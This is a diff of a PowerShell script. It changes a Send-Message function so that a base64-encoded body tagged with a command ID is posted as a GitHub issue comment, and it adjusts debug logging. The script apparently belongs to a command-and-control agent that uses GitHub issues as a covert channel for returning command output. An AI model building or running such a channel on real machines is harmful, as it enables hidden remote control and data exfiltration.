@@ -34,9 +34,9 @@ function Send-Message
             Write-Console -Message ("body is currently set to " + $body)
             $encodedBody = [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes($body))
             Write-Console -Message ("encodedBody is currently set to " + $encodedBody)
-            $mergedBody = "[" + $commandID + "]:" + $encodedBody
+            [string]$mergedBody = "[" + [string]$commandID + "]:" + [string]$encodedBody
             Write-Console -Message ("Merged body is " + $mergedBody)
-            New-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue -Body ([string]"Hello world! Testing 123adjsklfajdsklgakldsjgkladnsgkljadskfjkamdnsfklajndskfljaksdjfkalsnmdfklanmsdkfmaksdjfkangkjnasdkgfjasdkfjkalsdfjklasdjadjsklfajdsklgakldsjgkladnsgkljadskfjkamdnsfklajndskfljaksdjfkalsnmdfklanmsdkfmaksdjfkangkjnasdkgfjasdkfjkalsdfjklasdjadjsklfajdsklgakldsjgkladnsgkljadskfjkamdnsfklajndskfljaksdjfkalsnmdfklanmsdkfmaksdjfkangkjnasdkgfjasdkfjkalsdfjklasdjadjsklfajdsklgakldsjgkladnsgkljadskfjkamdnsfklajndskfljaksdjfkalsnmdfklanmsdkfmaksdjfkangkjnasdkgfjasdkfjkalsdfjklasdjadjsklfajdsklgakldsjgkladnsgkljadskfjkamdnsfklajndskfljaksdjfkalsnmdfklanmsdkfmaksdjfkangkjnasdkgfjasdkfjkalsdfjklasdjadjsklfajdsklgakldsjgkladnsgkljadskfjkamdnsfklajndskfljaksdjfkalsnmdfklanmsdkfmaksdjfkangkjnasdkgfjasdkfjkalsdfjklasdj")
+            New-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue -Body ([string]$mergedBody)
         }           
     }
     catch
@@ -66,7 +66,7 @@ function Write-Console
             Write-Host ("DEBUG: " + $message)
         }
 
-        $consoleLog = $consoleLog + $timeStamp +  ": " + $message + "`n"
+        $consoleLog = [string]$consoleLog + [string]$timeStamp +  ": " + [string]$message + "`n"
 	}
 	catch
 	{
@@ -597,7 +597,7 @@ function Start-LoopMode
 #ENTRY POINT
 
 $debugMode = $True
-$consoleLog = ""
+$consoleLog = "TEST CONSOLE LOG - FIRST MESSAGE"
 Write-Console -Message ("Program starting with debug mode set to " + $debugMode + ".")
 
 #Check to see if powershell is already running.  If it is, exit the script. This will prevent the script from rendering powershell unusable on the computer.
